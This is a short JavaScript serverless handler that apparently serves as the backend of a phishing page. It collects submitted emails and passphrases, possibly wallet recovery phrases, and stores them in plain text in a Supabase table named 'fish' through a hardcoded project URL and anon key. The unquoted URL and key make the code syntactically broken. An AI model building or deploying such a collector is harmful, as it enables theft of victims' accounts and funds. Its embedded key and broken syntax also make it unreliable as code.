// /api/submit.js
import { createClient } from '@supabase/supabase-js';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, passphrase } = req.body;

    if (!email || !passphrase) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const supabaseUrl = https://qhexhiowtraitrmpbrdc.supabase.co;
    const supabaseAnonKey =eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFoZXhoaW93dHJhaXRybXBicmRjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDA3ODA1MDEsImV4cCI6MjA1NjM1NjUwMX0.yTMGef9EAZuYMzoPfWcdAoW8-BxoHgYUFDBCdDftOxw;

    if (!supabaseUrl || !supabaseAnonKey) {
        console.error("Supabase environment variables are missing.");
        return res.status(500).json({error: "Internal Server Error: Supabase credentials missing."})
    }

    const supabase = createClient(supabaseUrl, supabaseAnonKey);

    try {
      const { error } = await supabase
        .from('fish') // Table name changed to 'fish'
        .insert([{ email, passphrase }]); // Storing plain text!

      if (error) {
        console.error('Supabase error:', error);
        return res.status(500).json({ error: 'Database error' });
      }

      res.status(200).json({ message: 'Credentials submitted!' });
    } catch (error) {
      console.error('Server error:', error);
      res.status(500).json({ error: 'Server error' });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}